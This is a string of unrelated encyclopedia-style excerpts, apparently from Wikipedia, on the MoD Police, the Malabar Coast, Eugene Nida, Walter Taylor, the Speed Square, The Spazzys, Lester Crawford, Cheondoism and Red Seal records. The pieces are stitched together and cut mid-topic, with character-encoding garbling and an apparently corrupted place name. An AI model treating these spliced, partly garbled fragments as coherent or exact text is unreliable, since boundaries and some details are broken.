OSU South were tasked to search MoD Headquarters in Whitehall, and carry out an investigation to uncover the person(s) responsible for leaking a highly damaging letter from Defence Secretary Liam Fox to Prime Minister David Cameron, to the press. In the letter, Fox expressed grave concerns about forthcoming defence cuts. No one was ever charged. * 8 August 2011: The 2011 England riots. Two days after the riots began, as a result of a direct tasking from the Home Office, the Chief Constable MDP deployed all available MDP public order officers to the Metropolitan Police Area to assist with restoration and the maintenance of public order in London. MDP General Police Duties officers were also sent to reinforce Essex police, to backfill for Essex officers who had been sent into London. * 24 May 2017 Manchester Arena bombing MOD police officers were deployed to assist Kent police, Nottinghamshire police, and Leicestershire police among others as part of Operation Tempererhttp://www.heart.co.uk/kent/news/local/mod-police-to-help- patrol-kent/ ControversyIn December 2013, the Daily Mirror and the Daily Mail reported on an alleged security breach at the MDP's Atomic Weapons Establishment Burghfield site in Berkshire. It was alleged that officers had failed to complete their patrols fully, ignored key duties, and had been caught sleeping while on duty. An MoD spokesperson denied that sleeping on duty formed part of the allegations, instead stating that \\"a number of officers are under investigation for failing to complete their full patrols\\". The articles reported that up to 50 MoD Police officers were under investigation and that seven had already resigned without facing disciplinary action. The matter was referred to the Independent Police Complaints Commission. Affiliated police forces The Ministry of Defence also has responsibility for two other civilian police forces: * The Sovereign Base Areas Police (SBAP), Cyprus: The SBAP provide a full range of policing for both the Eastern and Western Sovereign Base Areas of Cyprus. * The Gibraltar Defence Police (GDP): The GDP provide police services on Ministry of Defence land and waters in Gibraltar. Officers from both these forces occasionally attend courses at the Ministry of Defence Police Training College at Wethersfield, Essex. In June 2005, officers from the GDP marine unit gave assistance to the MoD Police marine unit at Portsmouth during the Trafalgar 200 celebrations.

Geographically, it comprises the wettest regions of southern India, as the Western Ghats intercept the moisture-laden monsoon rains, especially on their westward-facing mountain slopes. Culturally, it covers the northern part of the Kerala state along with Tulu Nadu and Kodagu district, from the Arabian Sea inland to the Western Ghats. The term is sometimes used to refer to the entire Indian coast from the western coast of Konkan to the tip of the subcontinent at Kanyakumari.Britannica Mar Sabor and Mar Proth arrived in Kollam in 9th century Definitions Bekal Fort Beach, Kerala The term Malabar Coast, in historical contexts, refers to India's southwestern coast, which lies on the narrow coastal plain of Karnataka and Kerala states between the Western Ghats range and the Arabian Sea. The coast runs from south of Goa to Kanyakumari on India's southern tip. India's southeastern coast is called the Coromandel Coast.Map of Coromandel Coast on a website dedicated to the East Indian Campaign (1782‚Äì1783), an offshoot of the American war of independence. In ancient times the term Malabar was used to denote the entire south-western coast of the Indian peninsula. The region formed part of the ancient kingdom of Chera until the early 12th century. Following the breakup of the Chera Kingdom, the chieftains of the region proclaimed their independence. Notable among these were the Kolathiris, Travancore, Zamorins of Calicut, the Coylot Wanees Country of northeast and coastal Ceylon (including Puttalam), Valluvokonathiris of Valluvanad. The name Malabar Coast is sometimes used as an all-encompassing term for the entire Indian coast from Konkan to the tip of the subcontinent at Kanyakumari. This coast is over long and stretches from the coast of southwestern Maharashtra, along the region of Goa, through the entire western coast of Karnataka and Kerala, and up to Kanyakumari. It is flanked by the Arabian Sea on the west and the Western Ghats on the east. The southern part of this narrow coast is referred to as the South Western Ghats moist deciduous forests.Tipu Sultan - the Tyrant of Mysore, Sandeep Balakrishna, (Chapter 10) pg 109 Malabar is also used by ecologists to refer to the tropical and subtropical moist broadleaf forests of southwestern India (present-day Kerala). Etymology The whole name Malabar is first attested in Arabic (as malabaar) in the writing of Al Biruni. The second part of the name is thought by scholars to be the Arabic word barr ('continent') or its Persian relative bar ('country'). The first element of the name, however, is attested already in the Topography written by Cosmas Indicopleustes in the sixth century CE. This mentions a pepper emporium called Male, which clearly gave its name to Malabar ('the country of Male'). The name male is thought to come from the Malayalam word mala ('hill').C. A. Innes and F. B. Evans, Malabar and Anjengo, volume 1, Madras District Gazetteers (Madras: Government Press, 1915), p. 2.M. T. Narayanan, Agrarian Relations in Late Medieval Malabar (New Delhi: Northern Book Centre, 2003), xvi-xvii. Alternative etymologies have been proposed, however, for example that Malabar derives from the Malayalam word Mala-Baram, 'hill slope' (since Malayalam varam means 'slope' or 'side of a hill'). Geography =Physical geography= The term Malabar Coast is sometimes used as an all-encompassing term for the entire Indian coast from the western coast of Konkan to the tip of the subcontinent at Cape Comorin. It is over 525 miles or 845 kilometers long. It spans from the south-western coast of Maharashtra and goes along the coastal region of Goa, through the entire western coast of Karnataka and Kerala and reaches till Kanyakumari. It is flanked by the Arabian Sea on the west and the Western Ghats on the east. The Southern part of this narrow coast is the South Western Ghats moist deciduous forests. Climate-wise, the Malabar Coast, especially on its westward-facing mountain slopes, comprises the wettest region of southern India, as the Western Ghats intercept the moisture- laden Southwest monsoon rains. =Malabar rainforests= The Malabar rainforests include these ecoregions recognized by biogeographers: # the Malabar Coast moist forests formerly occupied the coastal zone, up to the 250 meter in elevation (but 95% of these forests no longer exist) # the South Western Ghats moist deciduous forests grow at intermediate elevations # the South Western Ghats montane rain forests cover the areas above 1000 meters The Monsooned Malabar coffee bean comes from this area. =Port cities= The Malabar Coast featured (and in some instances still does) several historic port cities. Notable among these were/are Naura, Vizhinjam, Muziris, Nelcynda, Beypore and Thundi (near Kadalundi) during ancient times, and Kozhikode (Calicut), Cochin in the medieval period, and have served as centers of the Indian Ocean trade for millennia. Because of their orientation to the sea and to maritime commerce, the Malabar coast cities feel very cosmopolitan, and have been home to some of the first groups of Jews (known today as Cochin Jews), Syrian Christians (known as Saint Thomas Christians), Muslims (presently known as Mappilas), and Anglo-Indians in India.The Jews of India: A Story of Three Communities by Orpa Slapak.

The Oddeway Torre settlement (part of Danish India) has served as a center of the Indian Ocean trade for centuries.The spicy history of Malabar including a bibliography of sources on the spice trade via the Malabar coast During Ming China's treasure voyages in the early 15th century, Admiral Zheng He's fleet often landed at the Malabar Coast. Soon after, Vasco da Gama landed near Calicut in 1498, establishing a sea route between India and Europe. Portugal became the first of several European maritime empires to grow rich from the spice trade with this area. =British colonialism: Malabar District= After the Anglo-Mysore wars, the region was organized into a district of Madras Presidency. The British district included the present-day districts of Kannur, Kozhikode, Wayanad, Malappuram, much of Palakkad (Excluding Chittur taluk) and some parts of Thrissur (Chavakkad Taluk). The administrative headquarters was at Calicut (Kozhikode). Malabar District, a part of the ancient Malabar (or Malabar Coast) was a part of the British East India Company-controlled state. It included the northern half of the state of Kerala and some coastal regions of present-day Karnataka. The area is predominantly Hindu, but a part of Kerala's Muslim population (Mappila) also live in this area, as well as a sizable ancient Christian population. Kozhikode is considered as the capital of Malabar. During the British rule, Malabar's chief importance lay in producing pepper.Pamela Nightingale, ‚ÄòJonathan Duncan (bap. 1756, d. 1811)‚Äô, Oxford Dictionary of National Biography, Oxford University Press, 2004; online edn, May 2009 The area was divided into two categories as North and South. North Malabar comprises present Kasaragod and Kannur Districts, Mananthavady Taluk of Wayanad District and Vatakara and Koyilandy Taluks of Kozhikode District. The left-over area is South Malabar aka Eranad Taluk which comes under present Malappuram District, Palakkad District and Chavakkad taluk of Thrissur district. =After Indian independence= With India's independence, Madras presidency became Madras State, which was divided along linguistic lines on 1 November 1956, whereupon Kasaragod region was merged with the Malabar immediately to the north and the state of Travancore-Cochin to the south to form the state of Kerala. Before that, Kasaragod was a part of South Canara district of Madras Presidency.

Nida (November 11, 1914 - August 25, 2011) was a linguist who developed the dynamic-equivalence Bible-translation theory and one of the founders of the modern discipline of translation studies.  Life  Eugene Albert Nida was born in Oklahoma City, Oklahoma on November 11, 1914. He became a Christian at a young age, when he responded to the altar call at his church \\"to accept Christ as my Saviour.\\"Bankson, Benjamin A. \\"New Facts in Translations.\\" Bible Society Record. February 1969, p. 26. He graduated summa cum laude from the University of California in 1936. After graduating he attended Camp Wycliffe, where Bible translation theory was taught. He ministered for a short time among the Tarahumara Indians in Chihuahua, Mexico, until health problems due to an inadequate diet and the high altitude forced him to leave. Sometime in this period, Nida became a founding charter member of Wycliffe Bible Translators, a related organization to the Summer Institute of Linguistics. In 1937, Nida undertook studies at the University of Southern California, where he obtained a master's degree in New Testament Greek in 1939. In that same year he became interim pastor of Calvary Church of Santa Ana, California following the resignation of its founding pastor.Calvary Church of Santa Ana, CA, previous pastors Despite his conservative background, in later years Nida became increasingly ecumenical and New Evangelical in his approach.George, Calvin. The History of the Reina-Valera 1960 Spanish Bible, Morris Publishing, 2004, p. 100 In 1943, Nida received his Ph.D. in Linguistics from the University of Michigan. He was ordained as a Baptist minister. He married Althea Lucille Sprague in 1943 and settled in Greenwich, Connecticut. Althea Sprague died in 1993. In 1997, he married Mar√≠a Elena Fernandez-Miranda, a lawyer and diplomatic attache. Nida retired in the early 1980s, although he continued to give lectures in universities all around the world, and lived in Alpine, Arizona, USA ; Madrid, Spain and Brussels, Belgium . He died in Madrid on August 25, 2011, aged 96.  Career  In 1943, Nida began his career as a linguist with the American Bible Society (ABS). He was quickly promoted to Associate Secretary for Versions, then worked as Executive Secretary for Translations until his retirement. Nida was instrumental in engineering the joint effort between the Vatican and the United Bible Societies (UBS) to produce cross-denominational Bibles in translations across the globe. This work began in 1968 and was carried on in accordance with Nida's translation principle of Functional Equivalence. Nida received an Honorary Doctorate from Heriot-Watt University in 1974.  Theories  Nida has been a pioneer in the fields of translation theory and linguistics. His Ph.D. dissertation, A Synopsis of English Syntax, was the first full-scale analysis of a major language according to the \\"immediate- constituent\\" theory. His textbook Morphology: The Descriptive Analysis of Words was one of the major works of American Structuralism. It remained the only thorough introduction to the field for decades and is still valuable for its many examples and exercises. His most notable contribution to translation theory is Dynamic Equivalence, also known as Functional Equivalence. For more information, see \\"Dynamic and formal equivalence.\\" Nida also developed the componential analysis technique, which split words into their components to help determine equivalence in translation (e.g. \\"bachelor\\" = male + unmarried). This is, perhaps, not the best example of the technique, though it is the most well-known. Nida's dynamic-equivalence theory is often held in opposition to the views of philologists who maintain that an understanding of the source text (ST) can be achieved by assessing the inter-animation of words on the page, and that meaning is self-contained within the text (i.e. much more focused on achieving semantic equivalence). This theory, along with other theories of correspondence in translating, are elaborated in his essay Principles of Correspondence,Nida, Eugene. ‚ÄúPrinciples of Correspondence‚Äù. The Translation Studies Reader. Ed. Lawrence Venuti. NY: Routledge, 2004. 153-167 where Nida begins by asserting that given that \\"no two languages are identical, either in the meanings given to corresponding symbols or in the ways in which symbols are arranged in phrases and sentences, it stands to reason that there can be no absolute correspondence between languages. Hence, there can be no fully exact translations.\\" Nida, Ed. Venuti. p. 153 While the impact of a translation may be close to the original, there can be no identity in detail. Nida then sets forth three factors that must be taken into account in translating: # The nature of the message: in some messages the content is of primary consideration, and in others the form must be given a higher priority. # The purpose of the author and of the translator: to give information on both form and content; to aim at full intelligibility of the reader so he/she may understand the full implications of the message; for imperative purposes that aim at not just understanding the translation but also at ensuring no misunderstanding of the translation. # The type of audience: prospective audiences differ both in decoding ability and in potential interest. While reminding that while there are no such things as \\"identical equivalents\\" in translating, Nida asserts that a translator must find the \\"closest natural equivalent.\\" Here he distinguishes between two approaches to the translation task and types of translation: Formal Equivalence (F-E) and Dynamic Equivalence (D-E). F-E focuses attention on the message itself, in both form and content. Such translations then would be concerned with such correspondences as poetry to poetry, sentence to sentence, and concept to concept. Such a formal orientation that typifies this type of structural equivalence is called a \\"gloss translation\\" in which the translator aims at reproducing as literally and meaningfully as possible the form and content of the original. The principles governing an F-E translation would then be: reproduction of grammatical units; consistency in word usage; and meanings in terms of the source context. D-E on the other hand aims at complete \\"naturalness\\" of expression. A D-E translation is directed primarily towards equivalence of response rather than equivalence of form. The relationship between the target language receptor and message should be substantially the same as that which existed between the original (source language) receptors and the message. The principles governing a D-E translation then would be: conformance of a translation to the receptor language and culture as a whole; and the translation must be in accordance with the context of the message which involves the stylistic selection and arrangement of message constituents. Nida and Lawrence Venuti have proved that translation studies is a much more complex discipline than may first appear, with the translator having to look beyond the text itself to deconstruct on an intra-textual level and decode on a referential level‚Äîassessing culture- specific items, idiom and figurative language to achieve an understanding of the source text and embark upon creating a translation which not only transfers what words mean in a given context, but also recreates the impact of the original text within the limits of the translator's own language system (linked to this topic: George Steiner, the Hermeneutic Motion, pragmatics, field, tenor, mode and the locutionary, illocutionary and perlocutionary). For example, a statement that Jesus \\"met\\" someone must be carefully translated into a language which distinguishes between \\"met for the first time\\", \\"met habitually\\" and \\"encounter.\\"  Works  Published Works include the following: * Linguistic Interludes - (Glendale, CA: Summer Institute of Linguistics, 1944 (Revised 1947)) * The Bible Translator - (Journal founded and edited by Dr. Nida (retired), 1949- ) * Morphology: The Descriptive Analysis of Words - (Univ. of Michigan Press, 2nd ed. 1949) * Message and Mission - (Harper, 1960) * Customs, Culture and Christianity - (Tyndale Press, 1963) * Toward a Science of Translating - (Brill, 1964) * Religion Across Cultures - (Harper, 1968) * The Theory and Practice of Translation - (Brill, 1969, with C.R.

His most notable works are the Walter Taylor Bridge and the Graceville Methodist church, both of which are heritage-listed buildings.  Early life  Walter Taylor was born on 16 September 1872 in Sheffield, England, the third child of Walter Taylor (senior) and his wife Ann (n√©e Naylor).Walter Taylor South Action Group: Walter Taylor History, accessed 15 February 2011 In about 1882, the family immigrated to Brisbane, Queensland, Australia, where Walter (senior) took up work in the building trade, eventually setting up on his account as a contractor. The son Walter worked with his father and learned the construction industry on the job; he did not receive any formal training in architecture, construction or engineering. In 1899, his father Walter (senior) died in the Brisbane General Hospital, following an accident while building the engine sheds at Brisbane's Roma Street railway station. Despite being a busy contractor with many projects, the winding up of his father's estate over the following year revealed he was insolvent, leaving the family penniless. This experience had a profound effect on the young Walter. Walter Taylor married Brisbane-born Louisa Johanna Elvina Charlotte Braun in 1900 and they had a daughter Thelma Henrietta Alvina in 1901.Queensland Registrar-General of Births, Deaths and Marriages In 1902, Walter and his family sailed to England to gain more experience in the construction industry. They remained in England for 10 years, returning in 1912.  Professional life  Walter Taylor Bridge (Indooroopilly Toll Bridge) Between 1902 and 1912 in England, Walter Taylor was involved in the design and construction of fairground rides. On returning to Brisbane in 1912, Walter Taylor established a successful contracting business. He was involved in the construction of many Brisbane buildings and other civil engineering works, such as bridges. Projects he worked on included: * Brisbane Boys' College * new block at the Royal Brisbane and Women's Hospital in 1928 * the RSL Club in Elizabeth Street, Brisbane * the Boyne River bridge at Mundubbera in 1928 * the Barambah Creek bridge at Gayndah * the Downfall Creek bridge on the Redcliffe Road near Aspley * the swimming pool at Somerville House in 1923 * the Central Buildings on Honour Avenue in Graceville between Verney Road West and Rakeevan Road in 1924 * the Abbotsford Road Bridge (Albion Fiveways) in (Albion) in 1928 * extensions to the Church of England Grammar School (East Brisbane) in 1927 Graceville Uniting Church (formerly Graceville Methodist Church) However, Walter Taylor was not content to simply build projects envisaged and designed by others. He was a man of great vision and believed that modern construction projects could bring significant benefit to Brisbane's citizens. He proposed a series of projects, many of which encountered considerable opposition politically and financially. Unlike his father, Walter was very financially savvy and often came up with innovative funding solutions for his proposed projects. For example, he door-knocked the suburbs of Chelmer and Graceville to sell subscriptions to fund the construction of the Indooroopilly Toll Bridge and then used the tolls charged to pay back the loans and the investors. Projects that Walter Taylor proposed included: * Graceville Methodist Church (completed, now heritage-listed) * underground river tunnel from the Brisbane central business district to Woolloongabba (proposed 1924, but never built, although such a tunnel, the Clem 7, was built many years later in 2010) * Indooroopilly Toll Bridge (opened on 14 February 1936, now the heritage-listed Walter Taylor Bridge) * an underground parking station for the Brisbane central business district (proposed 1938, but never built, although a similar project, King George Square carpark, was built in the 1970s)  Personal life  The Gables As befitting a contractor, Walter Taylor constructed himself a fine home \\"The Gables\\" at 15 Molonga Drive, Graceville, and then in 1927 another fine home \\"Glenrae\\" on the Brisbane River at 95 Banks Street, Graceville, where he lived with his wife and daughter Thelma (until her marriage in 1928 to Victor Davis). The house \\"Glenrae\\" Walter Taylor was a devout Methodist and worshipped at the Sherwood Methodist church. His older brother Albert became a Methodist minister. Walter instigated, designed and built the Graceville Methodist Church in Oxley Road, Graceville, to serve the Graceville community of Methodists. It is often regarded as one of Brisbane's prettiest churches (and very popular for weddings). Walter and Louisa Taylor hosted many social occasions such as dances and garden parties in their home for the benefit of the church and its fund-raising. As the congregation had to borrow in order to build the Graceville Methodist Church, Walter Taylor's will provided funds to pay off the debt (following the death of his wife Louisa). His granddaughter Joan Davis was married in that Graceville Methodist Church, the service being conducted by her uncle Arthur Taylor. His grandson Noel Davis also became a church minister (and in 2011 published a book \\"The Remarkable Walter Taylor\\" about his grandfather).Bridge builder's stories revealed, Ipswich Advertiser, 31 January 2011, accessed 15 February 2011 Walter Taylor died in November 1955 and his wife Louisa in 1962.

A Speed Square (rafter square, rafter angle square, triangle square) is a triangular carpenters' marking out tool manufactured and sold by Swanson Tool Co., Inc. The Speed Square combines common functions of the combination square, try square, and framing square into one. Carpenters use it to make basic measurements and mark lines on dimensional lumber, and as a saw guide for short 45 and 90 degree cuts. While the name is trademarked to Swanson, it has become a genericised trademark with most similar rafter squares being called speed squares. History Albert J. Swanson invented the A Speed Square in 1925 as a carpenter's layout tool. He later founded Swanson Tool Company, Inc. to produce it.Swanson Tool Co. website Today, Swanson Tool Co. still manufactures and distributes the Speed Square and other carpentry tools from its headquarters in Frankfort, Illinois. SPEED and SPEED SQUARE are also registered trademarks of Swanson Tool Co., Inc.U.S. Patent and Trademark Office Database - SPEED U.S. Patent and Trademark Office Database - SPEED SQUARE Design Common lines made using a Speed Square include perpendicular cut marks, and angles for roofs, stairways, and decks. Embedded degree gradations on the tool eliminate complex trigonometry, making for speedy lines. Swanson makes variants of the tool in aluminum, steel, and composites such as HDPE‚Äîand several sizes, the original 7 inch, 8 inch, 25 cm and a 12 inch model for larger tasks. The tool is a right triangle with a ruler on one equal side and a fence on the other. It is marked with the word Pivot at the right angle point and displays Degrees on its hypotenuse, Common and Hip/Val markings on its midsection. *Degree indicates the angle in degrees from 0¬∞ to 90¬∞. *Common indicates the rise in inches over a 12 inch run for common rafters from 1 inch to 30 inch. *Hip/Val indicates the rise in inches over a 17 inch run for hip or valley rafters from 1 inch to 30 inch. Some models have divots for fitting a writing utensil to mark lumber with. Genuine Swanson Speed¬Æ Squares also have a diamond shape cutout on the ruler side at 3¬Ω inches. Usage Swanson Tool Co., Inc. describes the tool as a \\"Try Square, Miter Square, Protractor, Line Scriber, & Saw Guide\\" in one. The Swanson Speed Square comes with a pocket sized blue reference book that describes the tool's functions and contains charts for rafter lengths and widths from 3 to 40 feet. Among its basic uses are marking common, hip, valley and hip, or valley jack rafters, laying out stair stringers, determining and marking angles, and making square cuts on boards. This tool uses a 0¬∞ reference. This means when a board is squared off the tool reads 0¬∞. The angle derived is actually a complementary angle. For example a 22.5¬∞ angle is actually 67.5¬∞. The sum of the angles equals 90 degrees(22.5¬∞ +67.5¬∞= 90¬∞). It is obvious from a visual check that where the instruments displays 22.5¬∞ is not 22.5¬∞. Many of the new slide miters and miter boxes display both angles. Some of the new calculators have a 0¬∞ and a 90¬∞ references to do angular calculations. This can create much confusion if the user does not understand this angular calibration. To find an angle such as 22.5¬∞, hold the end of the square marked \\"pivot\\" against the board and rotate the square until the edge of the board lines up with appropriate number on the degree scale. Draw a line along the side of the square with the inches (pivot side) to indicate the angle for cutting. Use the \\"Common\\" scale to cut for Rise over Run.

Originally a classically trained pianist, he was a pioneer in the early use of the electronic organ (Hammond B3) in heavy metal. Career McJohn was born John Raymond Goadsby to middle class parents in Toronto, Ontario. They enrolled him in piano lessons at a young age which eventually enabled him to become a pioneer in the use of the electronic organ in rock and roll. \\"I was up at 4 a.m. daily to practice from the age of seven until‚Ä¶I got stupid.\\" \\"I was classically trained. I played on a Lowrey\\". This eventually gave songs such as \\"Born to be Wild\\" and \\"Magic Carpet Ride\\" their unique sound. In 1964, McJohn played with local band Little John & The Friars before moving on later that year to become a member of the Mynah Birds, which also included Rick James, Bruce Palmer and (after McJohn left) Neil Young. In March 1965, he briefly joined The Diplomats before joining The Sparrows in September of that year. John Kay asked him if he could be known as \\"Goldy\\" while riding the bus to Willowdale. Goldy felt \\"Goldy Goadsby\\" would not be right, so in honor of his mother, Dorothy (n√©e) McIntyre, Goldy added the \\"Mc\\" to his legal first name, creating his stage name. The band (with various changes) went on to become Steppenwolf and McJohn remained with the group from 1967 to early 1975, when he was fired by Kay. During Steppenwolf's hiatus in the early 1970s, McJohn and Steppenwolf drummer Jerry Edmonton formed Manbeast with Rod Prince and Roy Cox of Bubble Puppy, during which time the band penned at least one song that would appear on Steppenwolf's 1974 release, Slow Flux, McJohn's last with the band. McJohn helped reform Steppenwolf in 1977 with Nick St. Nicholas and Kent Henry and played in several incarnations of the band. He also played with Steve Marriott in a reconstituted version of Humble Pie. Prior to his death in 2017, McJohn had lived in Burien, Washington, with his wife Sonja.

A lot of them really, really hated us, but we came out in capes and stuff, and hopefully a few of them liked us by the end.\\" Their biggest response was by asking the crowd for a \\"fuck you\\". The band frequently mocked the audience by announcing song titles such as: \\"My Parents Don't Understand Me So I'm Going to My Room to Cut Myself\\". Kat declared that Manson \\"loved us, and he was the one who asked us to do the tour.\\" In 2011 Kat was employed as a criminal lawyer after obtaining her Bachelor of Laws (First Class Honours) from Victoria University and Graduate Diploma of Legal Practice at Australian National University. The Spazzys finally released Dumb Is Forever in 2011, which Graham Blackley of Beat Magazine opined \\"has been worth the lengthy wait.\\" He described how the group \\"have clearly maintained their tight and sprightly musicianship. There are plenty of '60s tinged bubble-gum melodies and ferocious wall-shaking firepower and they still manage to diversify their sound.\\" Dylan Stewart of The Music felt \\"fun and frivolous, and represents a flashback to another time... [with] a slight shift towards a poppier delivery compared to the brash punk sensibility they were then known for.\\" Madison Thomas of Tone Deaf caught their gig at the Tote in November 2012, \\"the Spazzys seamlessly slip back onto the Tote stage. Kat, Ally, and Lucy Spazzy are back and previewing a few well received songs from their album Dumb Is Forever.

The building includes a 108-seat auditorium as well as a bar serving local and ethical products. History Cube Microplex neon signage The wooden theatre at the heart of the Cube was adapted from a workshop by volunteers for an amateur dramatics group in 1964. The building itself has a long history as a community arts venue, built in 1916 as workshops for the Bristol Deaf Centre; and converted by a team of amateur theatre enthusiasts in 1964 into a theatre with 108-seat auditorium and fly tower. A projection room and cinema screen were added in the 1970s. The Cube opened its doors in its present form in October 1998. In July 2001 a serious fire originating in the New Mayflower kitchen destroyed most of the internal storeys and timber of 4 and 5 King Square, and although the Cube itself only sustained minor damage, its entrance was effectively destroyed, meaning it was cut off from use by the general public. After extensive rebuilding work, the Cube reopened in August 2002. In December 2013, a fund-raising project to buy the freehold of the Cube's building was successful in reaching its ¬£185,000 target.http://www.cubecinema.com/cgi-bin/freehold/freehold.pl?action=surplus On 1 April 2014 the Cube official became owned by Microplex Holdings Ltd, a non-profit Industrial and Provident Society and Community Land Trust (CLT) set up by Cube volunteers whose charter is to secure and maintain the freehold of the Cube Cinema as a community arts space in perpetuity. Programme Science Cabaret at the Cube The Cube's public programme averages over 350 events per year, with a monthly average attendance of 1500. Along with its cinema, music, performance and education programmes, the Cube hosts a wide range of local and international artists and community-initiated events. The film screenings include general and limited release mainstream films, art-house, cult films and work by local film makers. It offers special film screenings for mothers and babies. Regular nights have included stand-up comedy, screenings of classic or cult comedy films,http://simplelampoon.com/bristols-top-6-comedy- spots/ and a movieoke evening, in which audience members act out their chosen film scenes on stage as they are played on the big screen. Weekends often feature live music and performances. The building is also periodically hired to third parties to put on their own events. The Cube has played hosts to seasons and festivals, including the Venn Festival, Ladyfest Bristol, Bristol Radical History Group, Ausform Platform of Performance and Independent Heroine festivals. Its anti-corporate ethos led to projects such as Kate Rich and Kayle Brandon's Cube-Cola, based on an open source cola recipe, and Feral Trade which supplies various products to its bar using only personal social networks, including fair trade coffee from a farming cooperative in El Salvador. It has its own in-house improvising orchestra, the Orchestra Cube. The Cube has a history of setting up temporary cinemas in exotic locations, including a tin mine in Cornwall.

Bush. He served from July 18, 2005 until resigning two months later in September 2005.nndb.com, Lester Crawford On October 17, 2006, he pled guilty to a conflict of interest and false reporting of information about stocks he owned in food, beverage and medical device companies he was in charge of regulating. He received a sentence of three years of supervised probation and a fine of about $90,000. Education Crawford received a Doctor of Veterinary Medicine (DVM) degree from Auburn University in 1963 and a Ph.D. in pharmacology from the University of Georgia in 1969. In 2004 he worked for the Bush-Cheney election campaign of 2004 as well as being a member of the National Republican Senatorial Committee. Career From 1978 to 1980 and from 1982 to 1985 Crawford was director of the FDA's Center for Veterinary Medicine. From 1987 to 1991 Crawford was administrator of the Food Safety and Inspection Service at the U.S. Department of Agriculture. From 1997 to 2002, he was Director of the Center for Food and Nutrition Policy, based at Georgetown University before moving to Virginia Tech in 2001. Previously in his career he was chair of the Department of Physiology-Pharmacology at the University of Georgia, executive vice president of the National Food Processors Association, executive director of the Association of American Veterinary Medical Colleges, and a practicing veterinarian. Crawford served as a FDA Deputy Commissioner since February 25, 2002, and served as acting Commissioner for some of this time. Food and Drug Nomination His 2005 nomination was controversial because Senators Hillary Clinton of New York and Patty Murray of Washington, both Democrats, threatened to place holds on his confirmation vote until the FDA made its long-delayed decision on whether or not to allow emergency contraception to be sold over the counter, while Senator Tom Coburn of Oklahoma, a Republican, threatened to place a hold because the FDA failed to require new labels for condoms warning that they do not fully protect against sexually transmitted disease. Food and Drug Commissioner The Health, Education, Labor, and Pensions Committee approved the nomination on June 15, 2005, and Crawford was confirmed by the Senate on July 18, 2005 by a vote of 78-16, with six senators not voting. Crawford resigned on September 23, 2005, just a few short months later, in a surprise announcement. He denied that allegations of financial improprieties were the reason for his departure. Bush nominated Andrew von Eschenbach to succeed Crawford. Crawford joined a Washington lobbying firm, Policy Directions Inc. On April 28, 2006, Crawford's lawyer, Barbara Van Gelder, announced that he was being investigated by a grand jury over accusations of financial improprieties and false statements to Congress. On October 16, 2006, the U.S. Department of Justice charged Crawford with lying and violating conflict-of- interest laws for falsely reporting his ownership of stock in companies regulated by the FDA. He falsely stated in a 2004 government filing that he and his wife sold their shares of Sysco and Kimberly-Clark, when in fact they continued to hold them, and also failed to disclose income from exercising stock options in Embrex Inc.. Personal Crawford has been married since 1963 to Catherine Walker of Birmingham, Alabama. They have two daughters, Leigh and Mary, and four grandchildren.

Cheondoism has its origins in the peasant rebellions which arose starting in 1812 during the Joseon dynasty. Cheondoism incorporates elements of Korean shamanism.Lee Chi- ran, p.3 & p. 16 It places emphasis on personal cultivation and social welfare in the present world and rejects most notions of an afterlife, except for cyclical reincarnation. Splinter movements include Suwunism and Bocheonism.Lee Chi-ran, pp. 16-20 Name Cheondogyo translated literally means \\"religion of the Heavenly Way\\", where cheon means \\"Heaven\\", do means \\"Way\\" (written with the same character as Chinese Tao), and gyo means \\"religion\\", \\"teaching\\", \\"-ism\\". Beliefs Over time, Cheondoism has also adapted elements of other Korean religious traditions, including Taoism and Buddhism.

According to the church doctrine, the term \\"Haneul\\" does not only mean Heaven but represents the whole universe., Ï≤úÎèÑÍµêÍ∞úÍ¥Ä(ÏòÅÎ¨∏)-Ï≤úÎèÑÍµê This title implies the quality of Heaven as \\"instructor\\", that is a belief that man and things are not created by a supernatural (out of nature) God, but generated by a God that is inner in things.Lee Chi-ran, p. 16 Also in keeping with its Confucian background, Cheondoism places emphasis on personal cultivation in the belief that as one improves one's innate nature, one comes closer to Heaven, and that all things are the same as Heaven in terms of their innate quality. History Cheondogyo Central Temple in Seoul Cheondoism originated from the Donghak (\\"Eastern Learning\\"), a religious movement that arose in 19th-century Korea as a reaction to Western encroachment, particularly the spread of Catholicism. The Donghak movement began with Ch'oe Che-u in 1860,Young, Carl F. pp.6-7 but it became an officially-recognized religion under its third leader, Son Byong-hi.Young, Carl F. pp.113-121 Ch'oe Che-u formulated the Donghak ideology in 1860 as an alternative to Catholicism (\\"Western Learning\\"), which was gaining movement with the lower classes in Korea due to its ability to provide a sense of structure and stability beyond the family unit. Due to its basis in established religions‚ÄîConfucianism, Buddhism, and Taoism‚Äîand its commitment to representing Eastern ideals, the movement rapidly gained broad acceptance among the peasantry.Young, Carl F. pp.10-12 Cheondoism as a religion evolved in the early 1900s from the Donghak peasant liberation movements in the southern provinces of Korea, particularly the unsuccessful, yet consequential, rebellion of 1894. Followers of Donghak were severely persecuted until the establishment of the Protectorate Treaty of 1905, which guaranteed freedom of religion. Therefore, on 1 December 1905, Son Byong-hi decided to modernize the religion and usher in an era of openness and transparency in order to legitimize it in the eyes of the Japanese, who had strong influence over Korea at the time. As a result, he officially changed the name of Donghak to Cheondoism (\\"religion of the Heavenly Way\\"). Following this, a constitution and a Central General Bureau were laid out for the religion, centralizing it and making it more accessible to the public. Cheondoism today As of 2005, Cheondoism allegedly had about 1.13 million followers and 280 churches in South Korea. Very little is known of the activities of Cheondoists in North Korea. According to official statistics, Cheondoism had 2.8 million adherents in North Korea (12.9% of the total population) as of 2000.North Korea Cheondoists are nominally represented in North Korean politics by the minor Cheondoist Chongu Party. According to the 2015 national census, Cheondoism had about 65,000 followers in South Korea.

History Red Seal record circa 1940 The use of a distinctive red label for premium-priced records made by top-tier artists was a marketing strategy suggested by the Gramophone Company's agent in St. Petersburg, Russia, where the first \\"Gramophone Record Red Seal\\" discs were issued in late 1901 or early 1902.Label scans of some of the first Red Seal records, issued in St. Petersburg circa early 1902, showing explicit use of the words \\"Red Seal\\". Accessed 9 November 2016. Later in 1902 the practice was adopted by the home office in the United Kingdom, which preferred to refer to the records as \\"Red Labels\\", and by its United States affiliate, the Victor Talking Machine Company, in 1903. Led by the great Italian tenor Enrico Caruso, then just at the beginning of his worldwide fame, Victor Red Seal records changed the public's valuation of recorded music. Caruso's first records, made by the Gramophone Company in Milan, Italy in 1902, earned prestige as well as profits for the company and its affiliates. Five of Caruso's Milan records were issued by Victor on the Red Seal label in the United States in March, 1903 and soon other famous opera stars and classical instrumentalists were attracted to the studios of both Victor and the Gramophone Company, consolidating the positions of these firms as the market leaders in the field of serious music by famous artists. Early acoustical (non-electrical) recordings could be a surprisingly 